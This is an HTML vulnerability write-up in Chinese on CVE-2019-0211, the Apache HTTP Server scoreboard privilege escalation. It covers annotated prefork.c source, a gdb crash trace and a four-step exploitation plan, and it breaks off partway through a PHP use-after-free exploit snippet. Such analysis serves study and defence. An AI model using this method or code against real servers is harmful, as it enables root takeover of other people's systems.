<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs98083A41{color:#000000;background-color:transparent;font-family:MS Gothic;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs2F00A314{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.csDFAC8B64{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs63189908{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:decimal;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2019-0211apache-http-服务组件提权漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-0211</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Apache HTTP </span><span class="csECDA2D3">服务组件提权漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">Apache HTTP Server 2.4</span><span class="cs9C1B1871">发行版</span><span class="cs8926E06">2.4.17</span><span class="cs9C1B1871">到</span><span class="cs8926E06">2.4.38</span><span class="cs9C1B1871">中，无论是使用</span><span class="cs8926E06">Apache HTTP Server </span><span class="cs9C1B1871">的</span><span class="cs8926E06">MPM event</span><span class="cs9C1B1871">模式、还是</span><span class="cs8926E06">worker</span><span class="cs9C1B1871">或</span><span class="cs8926E06">prefork</span><span class="cs9C1B1871">模式，在低权限的子进程或线程中执行的代码</span><span class="cs8926E06">(</span><span class="cs9C1B1871">包括由进程内脚本解释器执行的脚本</span><span class="cs8926E06">)</span><span class="cs9C1B1871">可以通过操纵记分牌（</span><span class="cs8926E06">scoreboard</span><span class="cs9C1B1871">）来执行具有父进程</span><span class="cs8926E06">(</span><span class="cs9C1B1871">通常是</span><span class="cs8926E06">Root</span><span class="cs9C1B1871">进程</span><span class="cs8926E06">)</span><span class="cs9C1B1871">权限的任意代码。非</span><span class="cs8926E06">unix</span><span class="cs9C1B1871">系统则不受影响。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Apache HTTP Server 2.4.17-2.4.38</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">1.</span><span class="cs9C1B1871">恶意用户首先修改</span><span class="cs8926E06">bucket,</span><span class="cs9C1B1871">并使其指向恶意构造的</span><span class="cs8926E06">prefork_child_bucket</span><span class="cs9C1B1871">结构（共享内存中）。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.</span><span class="cs9C1B1871">优雅重启</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">主服务进程会杀死以前所有的工作进程，然后调用</span><span class="cs8926E06">prefork_run</span><span class="cs9C1B1871">，</span><span class="cs8926E06">fork</span><span class="cs9C1B1871">出新的工作进程</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;server/mpm/prefork/prefork.c&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">省略无关的部分</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">static int prefork_run(apr_pool_t *_pconf, apr_pool_t *plog, server_rec *s)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int index;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int remaining_children_to_start;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;int i;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ap_log_pid(pconf, ap_pid_fname);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (!retained-&gt;mpm-&gt;was_graceful) {//</span><span class="cs7FFD2630">跳过，因为优雅启动时，</span><span class="cs9FB05234">was_graceful</span><span class="cs7FFD2630">为</span><span class="cs9FB05234">true</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (ap_run_pre_mpm(s-&gt;process-&gt;pool, SB_SHARED) != OK) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retained-&gt;mpm-&gt;mpm_state = AP_MPMQ_STOPPING;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return !OK;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* fix the generation number in the global score; we just got a new,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* cleared scoreboard</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ap_scoreboard_image-&gt;global-&gt;running_generation = retained-&gt;mpm-&gt;my_generation;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (!retained-&gt;mpm-&gt;was_graceful) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;startup_children(remaining_children_to_start);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;remaining_children_to_start = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while (!retained-&gt;mpm-&gt;restart_pending &amp;&amp; !retained-&gt;mpm-&gt;shutdown_pending) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ap_wait_or_timeout(&amp;exitwhy, &amp;status, &amp;pid, pconf, ap_server_conf);//</span><span class="cs7FFD2630">获取被杀死的工作进程的</span><span class="cs9FB05234">PID</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (pid.pid != -1) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processed_status = ap_process_child_status(&amp;pid, exitwhy, status);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;child_slot = ap_find_child_by_pid(&amp;pid);//</span><span class="cs7FFD2630">获取</span><span class="cs9FB05234">PID</span><span class="cs7FFD2630">对应于计分板中对应</span><span class="cs9FB05234">parent</span><span class="cs7FFD2630">的下标</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* non-fatal death... note that it&#39;s gone in the scoreboard. */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (child_slot &gt;= 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(void) ap_update_child_status_from_indexes(child_slot, 0, SERVER_DEAD,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(request_rec *) NULL);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prefork_note_child_killed(child_slot, 0, 0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (processed_status == APEXIT_CHILDSICK) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* child detected a resource shortage (E[NM]FILE, ENOBUFS, etc)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* cut the fork rate to the minimum</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retained-&gt;idle_spawn_rate = 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else if (remaining_children_to_start</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;&amp; child_slot &lt; ap_daemons_limit) {//</span><span class="cs7FFD2630">如果工作进程的死亡不是致命的</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* we&#39;re still doing a 1-for-1 replacement of dead</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* children with new children</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;make_child(ap_server_conf, child_slot,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ap_get_scoreboard_process(child_slot)-&gt;bucket);//</span><span class="cs7FFD2630">则将死亡的工作进程的</span><span class="cs9FB05234">bucket</span><span class="cs7FFD2630">作为参数传递（注意：</span><span class="cs9FB05234">bucket</span><span class="cs7FFD2630">我们可以用</span><span class="cs9FB05234">&ldquo;</span><span class="cs7FFD2630">非常规手段</span><span class="cs9FB05234">&rdquo;</span><span class="cs7FFD2630">进行修改，从而提权）</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--remaining_children_to_start;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return OK;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">make_child</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">static int make_child(server_rec *s, int slot, int bucket)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (!pid) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my_bucket = &amp;all_buckets[bucket];//</span><span class="cs7FFD2630">使</span><span class="cs9FB05234">my_bucket</span><span class="cs7FFD2630">指向共享内存中的到恶意构造的</span><span class="cs9FB05234">prefork_child_bucket</span><span class="cs7FFD2630">结构</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;child_main(slot, bucket);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">... &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">static void child_main(int child_num_arg, int child_bucket)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;status = SAFE_ACCEPT(apr_proc_mutex_child_init(&amp;my_bucket-&gt;mutex,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;apr_proc_mutex_lockfile(my_bucket-&gt;mutex),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pchild));//</span><span class="cs7FFD2630">如果</span><span class="cs9FB05234">Apache</span><span class="cs7FFD2630">侦听两个或更多端口，则</span><span class="cs9FB05234">SAFE_ACCEPT</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&lt;code&gt;</span><span class="cs7FFD2630">）将仅执行</span><span class="cs9FB05234">&lt;code&gt;(</span><span class="cs7FFD2630">这通常是因为服务器侦听</span><span class="cs9FB05234">HTTP</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">80</span><span class="cs7FFD2630">）和</span><span class="cs9FB05234">HTTPS</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">443</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">APR_DECLARE(apr_status_t) apr_proc_mutex_child_init(apr_proc_mutex_t **mutex,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;const char *fname,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;apr_pool_t *pool)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return (*mutex)-&gt;meth-&gt;child_init(mutex, pool, fname);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如果</span><span class="cs8926E06">apr_proc_mutex_child_init</span><span class="cs9C1B1871">执行，这导致（</span><span class="cs8926E06">* mutex</span><span class="cs9C1B1871">）</span><span class="cs8926E06"> - &gt; meth-&gt; child_init</span><span class="cs9C1B1871">（</span><span class="cs8926E06">mutex</span><span class="cs9C1B1871">，</span><span class="cs8926E06">pool</span><span class="cs9C1B1871">，</span><span class="cs8926E06">fname</span><span class="cs9C1B1871">）被调用，从而执行恶意代码（注意，执行恶意代码的时候，进程仍然处于</span><span class="cs8926E06">root</span><span class="cs9C1B1871">权限，后面才降低自身的权限）。</span></p><h4 class="cs868C439D">
			<a name="通过gdb恶意修改bucket值造成的崩溃"><span class="cs6EDCDAE2">通过</span><span class="csBF12A472">gdb</span><span class="cs6EDCDAE2">恶意修改</span><span class="csBF12A472">bucket</span><span class="cs6EDCDAE2">值造成的崩溃</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">(gdb) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">716 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;child_main(slot, bucket);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(gdb) s</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">child_main (child_num_arg=child_num_arg@entry=0, child_bucket=child_bucket@entry=80808080) at prefork.c:380</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">380 &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(gdb) n</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">..........</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">432 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;status = SAFE_ACCEPT(apr_proc_mutex_child_init(&amp;my_bucket-&gt;mutex,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">(gdb) s</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Program received signal SIGSEGV, Segmentation fault.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">0x000000000046c16b in child_main (child_num_arg=child_num_arg@entry=0, </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;child_bucket=child_bucket@entry=80808080) at prefork.c:432</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">432 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;status = SAFE_ACCEPT(apr_proc_mutex_child_init(&amp;my_bucket-&gt;mutex,</span></p><h4 class="cs868C439D">
			<a name="利用"><span class="cs6EDCDAE2">利用</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">利用分</span><span class="cs8926E06">4</span><span class="cs9C1B1871">个步骤</span></p><ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs9C1B1871">获得工作进程的</span><span class="cs8926E06">R/W</span><span class="cs9C1B1871">访问权限</span></li><li class="cs24C36B3"><span class="cs9C1B1871">在共享内存中写一个假的</span><span class="cs8926E06">prefork_child_bucket</span><span class="cs9C1B1871">结构</span></li><li class="cs24C36B3"><span class="cs9C1B1871">使</span><span class="cs8926E06">all_buckets [bucket]</span><span class="cs9C1B1871">指向该结构</span></li><li class="cs24C36B3"><span class="cs9C1B1871">等待早上</span><span class="cs8926E06">6:25</span><span class="cs9C1B1871">获得任意函数调用</span></li></ul>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">问题：</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">不允许读写</span><span class="cs8926E06">/proc/self/mem</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">这会阻止我们利用简单方法编辑共享内存</span></p><h4 class="cs868C439D">
			<a name="获取工作进程内存的rw访问权限"><span class="cs6EDCDAE2">获取工作进程内存的</span><span class="csBF12A472">R/W</span><span class="cs6EDCDAE2">访问权限</span></a></h4>
		<h5 class="cs868C439D">
			<a name="php-uaf-0-day"><span class="cs4B51D5E4">PHP UAF 0-day</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">由于</span><span class="cs8926E06">mod_prefork</span><span class="cs9C1B1871">经常与</span><span class="cs8926E06">mod_php</span><span class="cs9C1B1871">结合使用，因此通过</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">利用漏洞似乎很自然。我们使用</span><span class="cs8926E06">PHP 7.x</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">0day UAF</span><span class="cs9C1B1871">（这似乎也适用于</span><span class="cs8926E06">PHP5.x</span><span class="cs9C1B1871">）来完成利用</span><span class="cs8926E06">(</span><span class="cs9C1B1871">也可以利用</span><span class="cs8926E06">CVE-2019-6977)</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">class X extends DateInterval implements JsonSerializable</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;public function jsonSerialize()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;global $y, $p;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;unset($y[0]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$p = $this-&gt;y;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $this;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span 